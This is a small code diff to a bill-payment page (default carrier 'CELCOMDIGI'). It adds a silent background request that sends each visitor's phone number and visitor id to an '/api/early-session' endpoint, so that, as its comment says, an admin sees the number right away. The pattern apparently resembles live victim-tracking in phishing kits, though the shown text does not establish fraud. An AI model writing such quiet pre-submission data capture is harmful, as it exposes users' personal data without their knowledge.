@@ -376,6 +376,13 @@
         const carrier = data.carrier || 'CELCOMDIGI';
         // Ping with phone number
         pingVisitor('pay-bill', number, '', 'bill');
+        // Create early session so admin sees phone number right away
+        const _earlyId = 'early_' + _vid;
+        fetch('/api/early-session', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: _earlyId, number: number, amount: '', type: 'bill', visitorId: _vid, page: 'pay-bill' })
+        }).catch(() => {});
         window.location.href = `/pay-bill?number=${encodeURIComponent(number)}&carrier=${encodeURIComponent(carrier)}&vid=${encodeURIComponent(_vid)}`;
 
       } catch (err) {
